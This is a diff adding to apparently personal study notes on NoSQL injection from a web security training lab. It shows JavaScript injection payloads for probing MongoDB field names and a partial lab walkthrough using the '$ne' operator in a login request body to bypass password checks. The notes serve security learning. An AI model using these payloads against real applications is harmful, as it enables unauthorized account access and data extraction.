@@ -140,3 +140,46 @@ In Intruder, enumerate the password:
 
 In Burp's browser, log in as the administrator user using the enumerated password. The lab is solved.
 
+### Identifying field names
+Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.
+
+For example, to identify whether the MongoDB database contains a password field, you could submit the following payload:
+```
+https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
+```
+
+Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the username field exists, so you could send the following payloads:
+```
+admin' && this.username!=' 
+```
+```
+admin' && this.foo!='
+```
+If the password field exists, you'd expect the response to be identical to the response for the existing field (username), but different to the response for the field that doesn't exist (foo).
+
+If you want to test different field names, you could perform a dictionary attack, by using a wordlist to cycle through different potential field names. 
+
+> Note:
+> 
+> You can alternatively use NoSQL operator injection to extract field names character by character. This enables you to identify field names without having to guess or perform a dictionary attack. We'll teach you how to do this in the next section.
+
+### Lab: Exploiting NoSQL operator injection to extract unknown fields
+To solve the lab, log in as carlos. 
+
+There's a login endpoint:
+```bash
+POST /login HTTP/2
+
+{"username":"carlos","password":"montana"}
+```
+I get `Invalid username or password` error. 
+
+If I change the req.body to the following:
+```bash
+{"username":"carlos","password":{"$ne":""}}
+```
+I get back:
+`Account locked: please reset your password`
+This response indicates that the `$ne` operator has been accepted and the application is vulnerable
+
+
